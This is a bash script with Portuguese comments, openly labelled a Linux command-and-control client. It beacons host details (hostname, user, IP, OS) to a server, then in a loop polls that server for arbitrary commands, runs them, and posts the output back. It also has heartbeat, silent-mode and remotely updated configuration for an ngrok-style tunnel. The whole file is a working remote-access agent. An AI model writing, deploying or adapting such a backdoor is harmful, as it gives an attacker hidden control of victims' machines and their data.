#!/bin/bash
# Script cliente C2 para Linux
# Este script conecta-se ao servidor C2 e executa comandos

NGROK_HOST="127.0.0.1"
NGROK_PORT=5000
RETRY_INTERVAL=5
SILENT_MODE=false

# Obter informações do host
get_host_info() {
    HOSTNAME=$(hostname)
    USERNAME=$(whoami)
    IP=$(hostname -I | awk '{print $1}')
    OS=$(uname -a)
    TIMESTAMP=$(date +%s)
    
    echo "{\"hostname\":\"$HOSTNAME\",\"username\":\"$USERNAME\",\"ip\":\"$IP\",\"os\":\"$OS\",\"time\":$TIMESTAMP}"
}

# Enviar relatório de status
send_status_report() {
    HOST_INFO=$(get_host_info)
    
    curl -s -X POST -H "Content-Type: application/json" -d "$HOST_INFO" "http://${NGROK_HOST}:${NGROK_PORT}/report/status"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar relatório de status"
    fi
}

# Enviar heartbeat
send_heartbeat() {
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/heartbeat"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar heartbeat"
    fi
}

# Enviar log
send_log() {
    LOG_MESSAGE=$1
    LOG_TYPE=${2:-"info"}
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"log\":\"$LOG_MESSAGE\",\"time\":$TIMESTAMP,\"type\":\"$LOG_TYPE\"}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/logs"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar log: $LOG_MESSAGE"
    fi
}

# Enviar erro
send_error() {
    ERROR_MESSAGE=$1
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"error\":\"$ERROR_MESSAGE\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/error"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar erro: $ERROR_MESSAGE"
    fi
}

# Enviar saída de comando
send_command_output() {
    COMMAND=$1
    OUTPUT=$2
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    # Escapar aspas e caracteres especiais no output
    OUTPUT_ESCAPED=$(echo "$OUTPUT" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"command\":\"$COMMAND\",\"output\":\"$OUTPUT_ESCAPED\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/output"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar saída de comando"
    fi
}

# Obter comando do servidor
get_command() {
    HOSTNAME=$(hostname)
    
    COMMAND=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/command?hostname=$HOSTNAME")
    
    echo "$COMMAND"
}

# Executar comando
execute_command() {
    COMMAND=$1
    
    if [ -z "$COMMAND" ]; then
        return
    fi
    
    send_log "Executando comando: $COMMAND"
    
    # Executar comando e capturar saída
    # O uso de 'script' permite capturar mesmo a saída de comandos como 'cd'
    OUTPUT=$(script -q -c "$COMMAND" /dev/null | sed '1d;$d')
    
    # Se não houver saída, usar uma mensagem padrão
    if [ -z "$OUTPUT" ]; then
        OUTPUT="Comando executado com sucesso, sem saída."
    fi
    
    send_command_output "$COMMAND" "$OUTPUT"
}

# Atualizar configuração
update_config() {
    CONFIG=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/config")
    
    if [ $? -eq 0 ]; then
        NGROK_HOST=$(echo "$CONFIG" | grep -o '"ngrok_host":"[^"]*"' | cut -d'"' -f4)
        NGROK_PORT=$(echo "$CONFIG" | grep -o '"ngrok_port":[0-9]*' | cut -d':' -f2)
        RETRY_INTERVAL=$(echo "$CONFIG" | grep -o '"retry_interval":[0-9]*' | cut -d':' -f2)
        SILENT_MODE=$(echo "$CONFIG" | grep -o '"silent_mode":(true|false)' | cut -d':' -f2)
    elif [ "$SILENT_MODE" = false ]; then
        echo "Falha ao atualizar configuração"
    fi
}

# Loop principal
main() {
    # Enviar relatório de status inicial
    send_status_report
    
    # Loop principal
    while true; do
        # Enviar heartbeat
        send_heartbeat
        
        # Obter e executar comando
        COMMAND=$(get_command)
        if [ ! -z "$COMMAND" ]; then
            execute_command "$COMMAND"
        fi
        
        # Atualizar configuração
        update_config
        
        # Informar que o script está atualizado
        send_log "Script remoto atualizado." "script_update"
        
        # Aguardar intervalo de tempo
        sleep $RETRY_INTERVAL
    done
}

# Iniciar o script
main